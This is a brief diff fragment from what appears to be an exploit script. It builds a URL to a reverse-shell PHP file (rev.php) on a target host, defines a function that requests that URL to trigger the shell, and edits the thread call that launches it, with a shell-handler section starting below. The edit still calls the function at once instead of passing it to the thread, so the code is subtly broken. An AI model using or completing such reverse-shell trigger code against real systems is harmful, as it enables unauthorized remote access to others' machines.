@@ -45,7 +45,7 @@ shell_url = f'http://{target}:30455/rev.php'
 def exploit(shell_url):
     requests.get(shell_url)
 def send_exploit():
-    threading.Thread(target=exploit).start()
+    threading.Thread(target=exploit(shell_url)).start()
 
 
 # Shell Handler
